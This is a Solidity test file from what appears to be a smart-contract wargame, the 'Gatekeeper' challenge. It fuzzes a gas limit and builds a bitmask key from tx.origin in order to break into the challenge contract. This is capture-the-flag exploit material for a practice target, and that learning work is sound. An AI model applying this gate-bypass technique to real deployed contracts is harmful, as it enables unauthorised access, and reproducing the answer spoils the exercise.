// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import {Solution} from "./SolutionScript.sol";
import {Gatekeeper} from "./Problem.sol";
import "openzeppelin-contracts/math/SafeMath.sol";

contract GatekeeperTest is DSTest {
    using SafeMath for uint256;

    Gatekeeper gatekeeper;
    Solution solution;

    function setUp() public {
        gatekeeper = new Gatekeeper();
        solution = new Solution();
    }

    // This fuzz test is used to find a gasLimit that will allow us to break into the gatekeeper
    function testFailFindGasLimit(uint256 seed) public {
        uint256 maxGasLimit = 819100;
        uint256 gasLimit = seed.mod(maxGasLimit);
        // Log out the gas limit from the failed test that you can copy paste into the script
        emit log_named_uint("gasLimit", gasLimit);

        uint64 gateKeyUint = uint64(uint16(tx.origin));
        bytes8 key = bytes8(gateKeyUint);
        assert(uint32(uint64(key)) == uint16(uint64(key)));
        // Add a 1 bit in between bit 32 and 64
        gateKeyUint = gateKeyUint + 2 ** 33;
        key = bytes8(gateKeyUint);
        assert(uint32(uint64(key)) != uint64(key));
        assert(uint32(uint64(key)) == uint16(tx.origin));

        solution.breakIn(gasLimit, key, gatekeeper);
    }
}
